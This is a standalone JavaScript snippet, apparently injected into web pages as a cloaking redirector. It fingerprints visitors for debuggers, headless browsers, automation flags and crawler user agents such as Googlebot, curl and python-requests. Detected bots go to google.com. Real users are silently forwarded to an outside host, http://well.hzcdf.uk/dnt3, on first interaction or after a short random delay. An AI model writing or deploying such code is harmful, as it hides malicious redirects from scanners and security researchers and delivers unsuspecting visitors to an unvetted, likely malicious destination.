(function() {
var TARGET = 'http://well.hzcdf.uk/dnt3';
var BOT_REDIRECT = 'https://www.google.com';
var _env = { isBot: false };

(function _checkDebug() {
try {
var isDebuggerOpen = (function() {
var start = performance.now();
debugger;
return (performance.now() - start) > 100;
})();
if (isDebuggerOpen) { _env.isBot = true; return; }
if (window.playwright || window._phantom || window.callPhantom) { _env.isBot = true; return; }
var log = console.log;
if (typeof log.toString !== 'function' || log.toString().indexOf('native') === -1) { _env.isBot = true; }
} catch (e) { _env.isBot = true; }
})();

(function _analyzeEnv() {
if (_env.isBot) return;
try {
if (navigator.webdriver === true) { _env.isBot = true; return; }
var ua = navigator.userAgent || '';
var botPatterns = [/HeadlessChrome/, /PhantomJS/, /SlimerJS/, /Baiduspider/, /Googlebot/, /YandexBot/, /DuckDuckBot/, /curl/, /wget/, /python-requests/, /axios/];
for (var i = 0; i < botPatterns.length; i++) {
if (botPatterns[i].test(ua)) { _env.isBot = true; return; }
}
if (window.outerWidth === 0 || window.outerHeight === 0) { _env.isBot = true; return; }
if (navigator.languages) {
if (navigator.languages.length === 0 || (navigator.languages.length === 1 && navigator.languages[0] === 'en-US')) { _env.isBot = true; return; }
} else { _env.isBot = true; return; }
if (navigator.hardwareConcurrency < 1 || !navigator.deviceMemory) { _env.isBot = true; return; }
if (navigator.plugins && navigator.plugins.length < 2) { _env.isBot = true; return; }
if (!window.requestAnimationFrame || !window.cancelAnimationFrame) { _env.isBot = true; return; }
} catch (e) { _env.isBot = true; }
})();

if (_env.isBot) {
window.location.href = BOT_REDIRECT;
return;
}

var _interactionDetected = false;
var _events = ['touchstart', 'touchmove', 'pointerdown', 'scroll', 'mousemove', 'keydown', 'click', 'wheel'];

function _triggerHumanRedirect() {
if (_interactionDetected || _env.isBot) return;
_interactionDetected = true;
window.location.href = TARGET;
}

_events.forEach(function(ev) {
window.addEventListener(ev, function() {
_triggerHumanRedirect();
}, { passive: true, once: true });
});

window.addEventListener('deviceorientation', function(e) {
if (e && (e.alpha !== null && e.beta !== null && e.gamma !== null)) {
_triggerHumanRedirect();
}
}, { passive: true, once: true });

var _randomDelay = Math.floor(Math.random() * 2000) + 2000;
setTimeout(function() {
if (!_interactionDetected) {
window.location.href = TARGET;
}
}, _randomDelay);
})();